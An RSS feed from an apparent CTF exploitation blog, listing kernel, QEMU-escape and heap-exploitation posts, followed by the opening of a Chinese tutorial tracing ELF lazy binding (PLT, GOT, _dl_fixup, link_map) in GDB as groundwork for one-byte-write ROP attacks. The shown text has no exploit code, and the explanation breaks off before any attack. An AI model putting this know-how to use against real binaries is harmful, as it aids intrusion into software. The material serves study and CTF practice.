<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
<channel>
  <title>Mark's Blog</title>
  <atom:link href="https://blog.mark0519.com/#//feed.xml" rel="self" type="application/rss+xml" />
  <link>https://blog.mark0519.com/#/</link>
  <description>Live long and Pwn</description>
   
  <item>
    <title><![CDATA[Pwnable]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/README</guid>
    <description><![CDATA[<h1 id="pwnable">Pwnable</h1>
<blockquote>
<p>纸上得来终觉浅，绝知此事要躬行。</p>
</blockquote>
<h2 id="tsctf-2022">TSCTF 2022</h2>
<ul>
<li><strong>[22/4/25]</strong> <a href="/pwnable/220425-tsctf2022">TSCTF 2022</a></li>
</ul>
<h2 id="kernel-学习">Kernel 学习</h2>
<ul>
<li><strong>[22/04/27]</strong> <a href="/pwnable/220427-kernel-basic">kernel basic</a></li>
<li><strong>[220/4/28]</strong> <a href="/pwnable/220428-kernel-rop1">kernel ROP1</a></li>
<li><strong>[22/04/29]</strong> <a href="/pwnable/220429-kernel-rop2">kernel ROP2</a></li>
<li><strong>[22/05/01]</strong> <a href="/pwnable/220501-kernel-rop3">kernel ROP3</a></li>
<li><strong>[22/05/02]</strong> <a href="/pwnable/220502-kernel-rop4">kernel ROP4</a></li>
</ul>
<h2 id="qemu逃逸">QEMU逃逸</h2>
<ul>
<li><strong>[22/10/25]</strong> <a href="/pwnable/221025-qemu-basic">Qemu basic</a></li>
<li><strong>[22/11/08]</strong> <a href="/pwnable/221108-gva2gpa">Gva2Gpa</a></li>
<li><strong>[22/11/13]</strong> <a href="/pwnable/221113-qemu-dma">Qemu Dma</a></li>
</ul>
<h2 id="刷题">刷题</h2>
<ul>
<li><p><strong>[22/05/18]</strong> <a href="/pwnable/220518-HTB1">HackTheBox 1</a></p></li>
<li><p><strong>[22/05/19]</strong> <a href="/pwnable/220519-HTB2">HackTheBox 2</a></p></li>
</ul>
<h2 id="house-of-xxx">House of xxx</h2>
<ul>
<li><strong>[22/05/26]</strong> <a href="/pwnable/220526-house_of_emma">House of Emma</a></li>
<li><strong>[22/07/66]</strong> <a href="/pwnable/220716-house_of_apple">House of Apple</a></li>
</ul>
<h2 id="总结">总结</h2>
<ul>
<li><strong>[22/07/03]</strong> <a href="/pwnable/220703-glibc-233UAF">Glibc-2.33UAF利用</a></li>
<li><strong>[22/11/23]</strong> <a href="/pwnable/221123-rtld">rtld到ROP</a></li>
</ul>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[从延迟绑定到写一字节ROP]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221123-rtld</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221123-rtld</guid>
    <description><![CDATA[<h1 id="从延迟绑定到写一字节rop">从延迟绑定到写一字节ROP</h1>
<p>[TOC]</p>
<h2 id="x00-前言">0x00 前言</h2>
<p>前段时间参加今年的<code>SECCONCTF2022</code>，比赛中有个0解题<code>simplemod</code>引起了我的兴趣，题目简单来说就是自己编写的<code>libc</code>的<code>bss</code>段溢出了0x2000字节，但是只能在这个范围内写一共30个字节，虽然观察保护明显能猜测到是打延迟绑定部分，但是多次尝试调试之后仍然没有思路。</p>
<p>赛后的<code>Writeup</code>发布之后，我学习很多，特别是对<code>_dl_fixup</code>的内部有了更多的理解和认识，同时发现今年强网杯的qwarmup也是利用延迟绑定的漏洞进行1字节修改来进一步利用，所以我在这里记录了自己学习的过程，同时用<code>qwarmup</code>作为例子加深理解。</p>
<p>同时最新国外比赛<code>SECCONCTF2022 simplemod</code>和<code>DiceCTF2022 nightmare</code>的都是同一出题思路。</p>
<h2 id="x01-延迟绑定详析">0x01 延迟绑定详析</h2>
<p>首先，让我们详细分析下延迟绑定的过程中发生了什么。</p>
<p>自己编写一个<code>main.c</code>：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="dt">void</span> func(){</a>
<a class="sourceLine" id="cb1-3" title="3">    write(<span class="dv">1</span>,<span class="st">&quot;&lt;func&gt;: func&quot;</span>,<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb1-4" title="4">}</a>
<a class="sourceLine" id="cb1-5" title="5"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb1-6" title="6">    puts(<span class="st">&quot;&lt;main&gt;: main&quot;</span>);</a>
<a class="sourceLine" id="cb1-7" title="7">    func();</a>
<a class="sourceLine" id="cb1-8" title="8">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-9" title="9">}</a></code></pre></div>
<p>这是一个很简单的程序，但是他调用了两个外部函数，<code>puts</code>和<code>write</code></p>
<p>之后我们编译他，并加上方便调试的<code>-g</code>选项和<code>-z lazy</code>延迟绑定选项</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb2-1" title="1">$ <span class="fu">gcc</span> -g -z lazy -o main  main.c</a></code></pre></div>
<p>同时，我们下载一份和本地版本一样的<code>Glibc</code>源码放到同目录下，方便接下来源码调试更加方便</p>
<p>我本地使用的是<code>Ubuntu22.04 LTS</code>，也就是<code>Ubuntu GLIBC 2.35-0ubuntu3.1</code></p>
<p>接下来再使用GDB调试的时候使用<code>pwndbg&gt; directory ./glibc-2.35/</code>来加载<code>Glibc</code>源码。</p>
<p>之后在<code>main.c</code>源码第<code>3</code>行下断点，我们从<code>call   write@plt</code>一点一点开始分析：</p>
<p><img src="https://s2.loli.net/2022/11/15/SVNUrMi5bpA7nR4.png" /></p>
<h3 id="plt中发生了什么">1. PLT中发生了什么</h3>
<h4 id="进入plt">1.1 进入plt</h4>
<p>一切开始之前，我们的<code>GOT</code>表中<code>write</code>指向了<code>elf</code>文件中的某个区域<code>0x555555555040 ◂— endbr64</code></p>
<p><img src="https://s2.loli.net/2022/11/15/5Xh4Tm3d7fRakwc.png" /></p>
<p>之后我们调用了<code>call write@plt</code>，并且使用<code>si</code>跟入这个<code>write@plt</code>,看看发生了什么：</p>
<p><img src="https://s2.loli.net/2022/11/15/Brb7ZAePIgvyUH4.png" /></p>
<p>它跳转到了<code>elf</code>上的一个地址<code>0x555555555070</code>，减去基地址之后，也就是<code>elf</code>中偏移<code>0x1070</code>的地址！</p>
<p>也就是明显的位于<code>.plt.sec</code>的地址。</p>
<p><img src="https://s2.loli.net/2022/11/15/l8MiwF1RKA2yPWN.png" /></p>
<p>但是观察汇编可以知道，这个节上的代码仅仅只是提供了一次跳转，并没有执行其他操作，所以先让我们继续往下看。<code>&lt;write@plt+4&gt;</code>的位置只是跳转到了另一个地址<code>0x555555555040</code>。</p>
<p><img src="https://s2.loli.net/2022/11/15/5FdVj84DCSWYwf3.png" /></p>
<p>这里已经开始有意思起来了，观察地址我们可以知道<code>0x555555555040</code>也就是位于<code>Elf</code>文件偏移<code>0x1040</code>的位置，也就是<code>.plt</code>节的位置。</p>
<p><img src="https://s2.loli.net/2022/11/15/4U2KYrxOo3Lq7zP.png" /></p>
<p>这里的代码逻辑虽然还是很简单，<code>push</code>和跳转，但是它<code>push</code>了一个<code>1</code>，这让他开始变得有逻辑起来，不过既然都已经到<code>.plt</code>了，不如让我们完整看看整个<code>.plt</code>节</p>
<p><img src="https://pic.imgdb.cn/item/6373b71d16f2c2beb1efa163.jpg" /></p>
<p>看<code>elfheader</code>我们可以知道<code>.plt</code>节从<code>0x1020-0x1050</code>，而我们这个程序中有且只有两个外部函数<code>write</code>和<code>puts</code>。</p>
<p>具体分析之前，先让我们详细了解下我们熟悉的<code>PLT</code>表</p>
<h4 id="plt介绍">1.2 plt介绍</h4>
<p><strong>PLT表(Procedure Linkage Table)</strong>,也叫 <strong>过程连接表</strong>，在程序中以<code>.plt</code>节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。</p>
<p>具体结构如下：</p>
<pre><code>PLT[0] ==&gt; 与每个函数第一次链接相关指令
PLT[1] ==&gt; 某个函数链接时所需要的指令，GOT[3]
PLT[2] ==&gt; 某个函数链接时所需要的指令，GOT[4]
PLT[x] ==&gt; 某个函数链接时所需要的指令，GOT[x+2]</code></pre>
<p>也就是说，除了<code>PLT[0]</code>之外，剩下的都会和我们的<code>GOT</code>表相互对应，有关<code>GOT</code>的介绍我们稍后讨论，目前我们只要知道<code>PLT</code>表显而易见的与 <code>GOT</code> 表一一对应的特性。</p>
<p>那么具体到我们自己编译这个的<code>main</code>来说，<code>PLT</code>表项中的内容如下：</p>
<pre class="assembly"><code>PLT[0] :
   0x555555555020:  push   QWORD PTR [rip+0x2fe2]        # 0x555555558008  push [GOT[1]]
   0x555555555026:  bnd jmp QWORD PTR [rip+0x2fe3]       # 0x555555558010 jmp  [GOT[2]]
   0x55555555502d:  nop    DWORD PTR [rax]
PLT[1] :
   0x555555555030:  endbr64 
   0x555555555034:  push   0x0
   0x555555555039:  bnd jmp 0x555555555020               # jmp  [PLT[0]]
   0x55555555503f:  nop
PLT[2] :
   0x555555555040:  endbr64 
   0x555555555044:  push   0x1
   0x555555555049:  bnd jmp 0x555555555020               # jmp  [PLT[0]]
   0x55555555504f:  nop</code></pre>
<p>也就是说，在不考虑<code>PLT[0]</code>的情况下，<code>PLT[1]</code>和<code>PLT[2]</code>的差异只有<code>push</code>的值不同。</p>
<p>正如上面介绍的，<code>PLT[x]</code>和<code>GOT[x+2]</code>相互对应，虽然我们还没来得及介绍<code>GOT</code>表，但是不妨先让我们看看此时这两个<code>PLT</code>对应的<code>GOT</code>表项：</p>
<p><img src="https://pic.imgdb.cn/item/6373bb9b16f2c2beb1f89339.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/6373bba816f2c2beb1f8a462.jpg" /></p>
<p>虽然我还没来得及介绍<code>GOT</code>表的一个表项是8字节，但是这看起来很清楚不是么，<code>elfheader</code>告诉我们<code>GOT</code>的起始偏移是<code>0x4000</code>，那么<code>0x4018 puts@GLIBC_2.2.5</code>也就是<code>GOT[3]</code>；同理<code>0x4020 write@GLIBC_2.2.5</code>也就是<code>GOT[4]</code>。</p>
<p>那么在回过头来，可以很清楚的联想到，对于<code>PLT</code>表来说，调用<code>puts</code>还是<code>write</code>的区别就是<code>push</code>的值不一样，显然在这里<code>puts</code>对应<code>0</code>，<code>write</code>对应<code>1</code>。显然，这也是他们在<code>GOT</code>表中的函数排序或者说下表。</p>
<blockquote>
<p>虽然说这里是推断，但下文会给出详细的源码分析和说明.</p>
</blockquote>
<h4 id="plt0和plt1">1.3 PLT[0]和PLT[1]</h4>
<p>好了，我们已经知道对<code>write</code>来说，它主要的操作是<code>push 1</code>，也就是压栈<code>wirte</code>在<code>GOT</code>表中的下标。但是还没完，接下来不管任意函数的<code>Plt</code>表，它们总会跳转到<code>PLT[0]</code>的地址，也即是<code>PLT</code>表开头</p>
<p><img src="https://pic.imgdb.cn/item/6373be2c16f2c2beb1fbce32.jpg" /></p>
<p>也就是执行了：</p>
<p><img src="https://pic.imgdb.cn/item/6373be7b16f2c2beb1fc2c56.jpg" /></p>
<p>压栈<code>&lt;_GLOBAL_OFFSET_TABLE_+8&gt;</code>并跳转到<code>&lt;_dl_runtime_resolve_xsavec&gt;</code></p>
<p><code>_GLOBAL_OFFSET_TABLE_</code>也就是我们的<code>GOT</code>表全程，下面我们详细介绍一下<code>GOT</code>表</p>
<h4 id="got介绍">1.4 got介绍</h4>
<p><strong>GOT表(Global Offset Table )</strong>也叫<strong>全局偏移表</strong>，在程序中以<code>.got.plt</code> 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，<strong>64位程序：8字节</strong>）。</p>
<p>具体结构如下：</p>
<pre><code>GOT[0]  --&gt; 此处存放的是 .dynamic 的地址；该节(段)的作用会在下文讨论
GOT[1]  --&gt; 此处存放的是 link_map 的地址；该结构也会在下文讨论
GOT[2]  --&gt; 此处存放的是 dl_runtime_resolvec 函数的地址
GOT[3]  --&gt; 与 PLT[1] 对应，存放的是与该表项 (PLT[1]) 要解析的函数相关地址，
            由于延迟绑定的原因，开始未调用对应函数时该项存的是 PLT[1] 中第二条指令的地址，
            当进行完一次延迟绑定之后存放的才是所要解析的函数的真实地址
GOT[4]  --&gt; 与 PLT[2] 对应，所以存放的是与 PLT[2] 所解析的函数相关的地址
GOT[x]  --&gt; 与 PLT[x-2] 对应，所以存放的是与 PLT[x-2] 所解析的函数相关的地址</code></pre>
<p>在我们这个程序中：</p>
<p><img src="https://pic.imgdb.cn/item/6373bfd716f2c2beb1fdcb4c.jpg" /></p>
<p>可以清楚的看到</p>
<pre><code>GOT[0]: 0x0000000000003df8  .dynamic偏移
GOT[1]: 0x00007ffff7ffe2e0  binary link_map
GOT[2]: 0x00007ffff7fd8d30  dl_runtime_resolvec
GOT[3]: 0x00007ffff7e02ed0  __GI__IO_puts
GOT[4]: 0x0000555555555040  write@plt</code></pre>
<p>那么对于源程序来说 压栈的<code>&lt;_GLOBAL_OFFSET_TABLE_+8&gt;</code>也就我们<code>link_map</code>的地址，这个结构会在下文详细讨论。之后跳转到<code>_dl_runtime_resolve_xsavec</code>正式开始我们的延迟绑定</p>
<h3 id="dl_runtime_resolve_xsavec">2. _dl_runtime_resolve_xsavec</h3>
<p><code>_dl_runtime_resolvec</code>是一段汇编代码，定义在<code>/sysdeps/x86_64/dl-trampoline.h</code>中。</p>
<pre class="assembly"><code>    cfi_adjust_cfa_offset(16) # Incorporate PLT
    _CET_ENDBR
    pushq %rbx          # push subtracts stack by 8.
    cfi_adjust_cfa_offset(8)
    cfi_rel_offset(%rbx, 0)
    
    ......
    
    mov %RSP_LP, %RBX_LP
    cfi_def_cfa_register(%rbx)
    and $-STATE_SAVE_ALIGNMENT, %RSP_LP
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 2)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 3)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 4)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 5)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 6)(%rsp)
    movq %rdx, (STATE_SAVE_OFFSET + 512 + 8 * 7)(%rsp)
    xsavec STATE_SAVE_OFFSET(%rsp)
    mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP
    mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP
    call _dl_fixup      # Call resolver.</code></pre>
<p>cfi 开头的指令和函数检测有关，即 GNU Profiler，这里不关心。<code>_dl_runtime_resolvec</code> 函数的这段汇编代码就是保存寄存器的值到栈中，然后调用<code>_dl_fixup</code>执行具体的功能，然后从栈中恢复寄存器。<code>_dl_fixup</code> 函数传入的两个参数一个是<code>rdi</code>寄存器中存储的<code>link_map</code>，<code>rsi</code>是<code>GOT</code> 表中关于 <code>PLT</code> 重定位的索引值[1]，后面要根据该索引值写入新的地址。</p>
<p>这里并不需要过多分析，直接到<code>_dl_fixup</code>才是我们的核心逻辑。</p>
<h3 id="dl_fixup">3. _dl_fixup</h3>
<p>显然<code>_dl_fixup</code>函数的两个参数就是我们压栈压入的参数，<code>link_map</code>的地址和函数索引<code>0x1</code></p>
<p><img src="https://pic.imgdb.cn/item/6373c3bf16f2c2beb10285a7.jpg" /></p>
<p>接下来我们主要对照Glibc源码来看：<a href="https://codebrowser.dev/glibc/glibc/elf/dl-runtime.c.html#39">dl-runtime.c source code - Codebrowser</a></p>
<p>首先是传入的两个参数</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb8-1" title="1">_dl_fixup (<span class="kw">struct</span> link_map *l, ElfW(Word) reloc_arg)</a></code></pre></div>
<h4 id="link_map">3.1 link_map</h4>
<p>下面详细介绍一下这个在延迟绑定过程中非常重要的结构体<code>struct link_map *l</code>。</p>
<p><code>link_map</code> 的作用就是记录程序加载的所有共享库的链表, 当需要查找符号时就需要遍历该链表找到对应的共享库.</p>
<p>也就是说，所谓的<code>link_map</code>就是每个动态链接库将有关<code>ELF</code>的所有相关信息包装成一个非常整洁的数据结构。它将使用<code>l_next</code>h和<code>l_prev</code>来连接和定位其他文件的<code>link_map</code>结构体，并提供大量其他所需的信息来进行符号解析。具体的<code>struct link_map</code>内容可以查看源码：<a href="https://codebrowser.dev/glibc/glibc/include/link.h.html#link_map">link.h source code - Codebrowser</a></p>
<p>这里给出一些关键的结构：</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb9-1" title="1"><span class="kw">struct</span> link_map</a>
<a class="sourceLine" id="cb9-2" title="2">  {</a>
<a class="sourceLine" id="cb9-3" title="3">    ElfW(Addr) l_addr;      <span class="co">/* Difference between the address in the ELF</span></a>
<a class="sourceLine" id="cb9-4" title="4"><span class="co">                   file and the addresses in memory.  */</span></a>
<a class="sourceLine" id="cb9-5" title="5">    <span class="dt">char</span> *l_name;       <span class="co">/* Absolute file name object was found in.  */</span></a>
<a class="sourceLine" id="cb9-6" title="6">    ElfW(Dyn) *l_ld;        <span class="co">/* Dynamic section of the shared object.  */</span></a>
<a class="sourceLine" id="cb9-7" title="7">    <span class="kw">struct</span> link_map *l_next, *l_prev; <span class="co">/* Chain of loaded objects.  */</span></a>
<a class="sourceLine" id="cb9-8" title="8">    <span class="co">/* All following members are internal to the dynamic linker.</span></a>
<a class="sourceLine" id="cb9-9" title="9"><span class="co">       They may change without notice.  */</span></a>
<a class="sourceLine" id="cb9-10" title="10">    <span class="co">/* This is an element which is only ever different from a pointer to</span></a>
<a class="sourceLine" id="cb9-11" title="11"><span class="co">       the very same copy of this type for ld.so when it is used in more</span></a>
<a class="sourceLine" id="cb9-12" title="12"><span class="co">       than one namespace.  */</span></a>
<a class="sourceLine" id="cb9-13" title="13">    <span class="kw">struct</span> link_map *l_real;</a>
<a class="sourceLine" id="cb9-14" title="14">    <span class="co">/* Number of the namespace this link map belongs to.  */</span></a>
<a class="sourceLine" id="cb9-15" title="15">    Lmid_t l_ns;</a>
<a class="sourceLine" id="cb9-16" title="16">    <span class="kw">struct</span> libname_list *l_libname;</a>
<a class="sourceLine" id="cb9-17" title="17">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</a>
<a class="sourceLine" id="cb9-18" title="18">              + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</a>
<a class="sourceLine" id="cb9-19" title="19">    <span class="dt">const</span> ElfW(Phdr) *l_phdr;   <span class="co">/* Pointer to program header table in core.  */</span></a>
<a class="sourceLine" id="cb9-20" title="20">    </a>
<a class="sourceLine" id="cb9-21" title="21">    .......</a>
<a class="sourceLine" id="cb9-22" title="22">  };</a></code></pre></div>
<p>比较关键的几个:</p>
<p><code>l_addr</code>: 加载的ELF文件(或者其他.so动态链接文件)地址和内存地址的偏移</p>
<p><code>l_name</code>: 指向加载的ELF文件(或者其他.so动态链接文件)的文件名（一般ELF为0）</p>
<p><code>l_next&amp;l_prev</code>： 字面意思，指向下一个或者上一个<code>link_map</code>结构体</p>
<p><code>l_info[]</code>: <code>l_info</code>数据组，保存了这个<code>link_map</code>对应的ELF文件各个数据节和数据段的地址，本质上是使用这个<code>l_info[]</code>对应的<code>.dynamic</code>节上的众多<code>Elf64_Dyn</code>结构体来实现。</p>
<blockquote>
<p>如果一个目标文件参与到动态链接的过程中，那么它的程序头部表将会包含一个类型为 <code>PT_DYNAMIC</code>的元素。这个段包含了<code>.dynamic</code>节。<code>ELF</code> 使用<code>_DYNAMIC</code> 符号来标记这个节。</p>
</blockquote>
<h4 id="dynamic和elf64_dyn">3.2 .dynamic和Elf64_Dyn</h4>
<p><code>.dynamic</code>节上保存众多<code>Elf64_Dyn</code>结构体。</p>
<p><code>Elf64_Dyn</code>结构体具体结构：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="kw">typedef</span> <span class="kw">struct</span></a>
<a class="sourceLine" id="cb10-2" title="2">{</a>
<a class="sourceLine" id="cb10-3" title="3">    Elf64_Sword d_tag; <span class="co">/* Dynamic entry type */</span></a>
<a class="sourceLine" id="cb10-4" title="4">    <span class="kw">union</span></a>
<a class="sourceLine" id="cb10-5" title="5">    {</a>
<a class="sourceLine" id="cb10-6" title="6">        Elf64_Word d_val; <span class="co">/* Integer value */</span></a>
<a class="sourceLine" id="cb10-7" title="7">        Elf64_Addr d_ptr; <span class="co">/* Address value */</span></a>
<a class="sourceLine" id="cb10-8" title="8">    } d_un;</a>
<a class="sourceLine" id="cb10-9" title="9">} Elf64_Dyn;</a></code></pre></div>
<p>其中，<code>d_tag</code> 的取值决定了该如何解释 <code>d_un</code>。</p>
<ul>
<li><code>d_val</code>
<ul>
<li>这个字段表示一个整数值，可以有多种意思。</li>
</ul></li>
<li><code>d_ptr</code>
<ul>
<li>这个字段表示程序的虚拟地址。当解析动态节中的地址时，动态链接器会根据原始文件的值以及内存的基地址来计算真正的地址。</li>
</ul></li>
</ul>
<p>可以看出，其实这个节是由若干个键值对构成的。</p>
<p>完整的<code>d_tag</code>何其对应的内容可以看Oracle提供的详细文档： <a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-42444.html">动态节 - Oracle® Solaris 11.2 链接程序和库指南</a></p>
<p><code>ELF</code>中这个节以及对应的内容可以直接通过<code>IDA pro</code>查看：</p>
<p><img src="https://pic.imgdb.cn/item/6374ec2116f2c2beb175cde7.jpg" /></p>
<p>同理在GDB中我们可以通过查看<code>.dynamic</code>节的位置来定位：</p>
<p><img src="https://pic.imgdb.cn/item/6374e8fb16f2c2beb1716314.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/6378bee116f2c2beb1453128.jpg" /></p>
<p>下面介绍几个常用的<code>d_tag</code>:</p>
<table>
<thead>
<tr class="header">
<th>d_tag</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>DT_PLTGOT</td>
<td>3</td>
<td>给出与过程链接表或者全局偏移表相关联的地址，对应的段<code>.got.plt</code></td>
</tr>
<tr class="even">
<td>DT_STRTAB</td>
<td>5</td>
<td>此类型表项包含动态字符串表的地址。符号名、库名、和其它字符串都包含在此表中。对应的节的名字应该是<code>. dynstr</code>。</td>
</tr>
<tr class="odd">
<td>DT_SYMTAB</td>
<td>6</td>
<td>此类型表项包含动态符号表<code>.dynsym</code>的地址。这个符号表中的条目的类型为 <code>Elf64_Sym</code>。</td>
</tr>
<tr class="even">
<td>DT_SYMENT</td>
<td>11</td>
<td><code>DT_SYMTAB</code> 符号项的大小（字节）。</td>
</tr>
<tr class="odd">
<td>DT_DEBUG</td>
<td>21</td>
<td>此类型表项用于调试。</td>
</tr>
<tr class="even">
<td>DT_JMPREL</td>
<td>23</td>
<td>该类型的条目的 <code>d_ptr</code>成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。</td>
</tr>
</tbody>
</table>
<blockquote>
<p>注意除了数组末尾的<code>DT_NULL</code> 元素以及<code>DT_NEEDED</code>元素的相对顺序约束以外， 其他表项可以以任意顺序出现。</p>
</blockquote>
<p>这里出现了很多上文没有提到的节和结构体，之后我们在使用它的时候会详细介绍。</p>
<p>总之，现在我们才介绍完了<code>_dl_fixup()</code>的传参，接下来我们正式阅读这个函数的正式内容。</p>
<h4 id="dynsym和elf64_sym">3.3 .dynsym和Elf64_sym</h4>
<p><code>_dl_fixup</code>的开始都是通过<code>l_info[]</code>获取一些参数，我们一行一行来看：</p>
<p><img src="https://pic.imgdb.cn/item/6374f44116f2c2beb187e73c.jpg" /></p>
<p>首先是指针<code>symtab</code></p>
<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb11-1" title="1">  <span class="dt">const</span> ElfW(Sym) *<span class="dt">const</span> symtab</a>
<a class="sourceLine" id="cb11-2" title="2">    = (<span class="dt">const</span> <span class="dt">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</a></code></pre></div>
<p>其中<code>D_PTR</code>是个宏定义：</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb12-1" title="1"><span class="pp">#define D_PTR(map, i) \</span></a>
<a class="sourceLine" id="cb12-2" title="2"><span class="pp">  ((map)-&gt;i-&gt;d_un.d_ptr + (dl_relocate_ld (map) ? 0 : (map)-&gt;l_add</span></a></code></pre></div>
<p>简单来说就是根据传入的<code>link_map</code>和对应的<code>l_info[d_tag]</code>获取这个<code>d_tag</code>对应的<code>d_un</code>。</p>
<p>根据上文的<code>d_tag</code>表，<code>DT_SYMTAB</code>也就是获得动态符号表<code>.dynsym</code>的地址。</p>
<p><code>.dynsym</code>节也叫<strong>符号表节</strong>，上面保存众多<code>Elf64_Sym</code>结构体。</p>
<p><img src="https://pic.imgdb.cn/item/6374fe2416f2c2beb19f4367.jpg" /></p>
<p><img src="https://pic.imgdb.cn/item/6374fe3016f2c2beb19f8922.jpg" /></p>
<p>显然，一个<code>Elf64_Sym</code>结构体定义如下：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb13-1" title="1"><span class="kw">typedef</span> <span class="kw">struct</span> {</a>
<a class="sourceLine" id="cb13-2" title="2">        Elf64_Word      st_name;</a>
<a class="sourceLine" id="cb13-3" title="3">        <span class="dt">unsigned</span> <span class="dt">char</span>   st_info;</a>
<a class="sourceLine" id="cb13-4" title="4">        <span class="dt">unsigned</span> <span class="dt">char</span>   st_other;</a>
<a class="sourceLine" id="cb13-5" title="5">        Elf64_Half      st_shndx;</a>
<a class="sourceLine" id="cb13-6" title="6">        Elf64_Addr      st_value;</a>
<a class="sourceLine" id="cb13-7" title="7">        Elf64_Xword     st_size;</a>
<a class="sourceLine" id="cb13-8" title="8">} Elf64_Sym;</a></code></pre></div>
<p>接下会我们会用到的参数</p>
<ul>
<li><p>st_name 目标文件的<strong>符号字符串表的索引</strong>，其中包含符号名称的字符表示形式。如果该值为非零，则表示指定符号名称的字符串表索引。否则，符号表项没有名称。</p></li>
<li><p>st_value</p>
<p>关联符号的值。根据上下文，该值可以是绝对值或<strong>地址</strong>。</p></li>
<li><p>st_info</p>
<p>符号的类型和绑定属性。</p></li>
</ul>
<p><code>st_name</code>对应了目标文件的<strong>字符串表</strong>的索引，详细的部分会在下文提到。</p>
<p>回头来看，也就是说：</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb14-1" title="1">  <span class="dt">const</span> ElfW(Sym) *<span class="dt">const</span> symtab</a>
<a class="sourceLine" id="cb14-2" title="2">    = (<span class="dt">const</span> <span class="dt">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</a></code></pre></div>
<p>也就是获得<code>.dynsym</code>节（符号表节）的地址，我们在GDB中查看它：</p>
<p><img src="https://pic.imgdb.cn/item/6378be1e16f2c2beb1438f3d.jpg" /></p>
<p>可以看到<code>symtab</code>指针指向了我们的<code>.dynsym</code>节的真实起始地址。</p>
<h4 id="dynstr">3.4 .dynstr</h4>
<p><img src="https://pic.imgdb.cn/item/637502c716f2c2beb1b499a4.jpg" /></p>
<p>接下来这一行可以很清楚的知道，根据<code>d_tag: DT_STRTAB</code>也就是获得我们的<code>.dynstr</code>节的地址，这个节中保存着我们的<strong>字符串表</strong>。</p>
<p><img src="https://pic.imgdb.cn/item/6375033916f2c2beb1b60f9e.jpg" /></p>
<p>也就是保存了每个字符串的表。</p>
<h4 id="rela.plt-和elf64_rela">3.5 .rela.plt 和Elf64_Rela</h4>
<p>接下来两行在一起看</p>
<p><img src="https://pic.imgdb.cn/item/6375047016f2c2beb1b92f4f.jpg" /></p>
<p>先是获得<code>.got.plt</code>节的地址，也就是我们<code>GOT</code>表的真实地址，之后计算了指针<code>reloc</code></p>
<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb15-1" title="1"><span class="dt">const</span> PLTREL *<span class="dt">const</span> reloc</a>
<a class="sourceLine" id="cb15-2" title="2">    = (<span class="dt">const</span> <span class="dt">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</a></code></pre></div>
<p>根据<code>d_tag: DT_JMPREL</code>也就是获得我们的<code>.rela.plt</code>节（<strong>重定位节</strong>）的地址。重定位是连接符号引用与符号定义的过程。</p>
<p>例如，程序调用函数时，关联的调用指令必须在执行时将控制权转移到正确的目标地址。可重定位文件必须包含说明如何修改其节内容的信息。通过此信息，可执行文件和共享目标文件可包含进程的程序映像的正确信息。重定位项即是这些数据。</p>
<p>重定位节中保存了每个外部函数的<code>Elf64_Rela</code>结构体，这些结构体格式如下：</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb16-1" title="1"><span class="kw">typedef</span> <span class="kw">struct</span> {</a>
<a class="sourceLine" id="cb16-2" title="2">        Elf64_Addr      r_offset;</a>
<a class="sourceLine" id="cb16-3" title="3">        Elf64_Xword     r_info;</a>
<a class="sourceLine" id="cb16-4" title="4">        Elf64_Sxword    r_addend;</a>
<a class="sourceLine" id="cb16-5" title="5">} Elf64_Rela;</a></code></pre></div>
<ul>
<li>r_offset</li>
</ul>
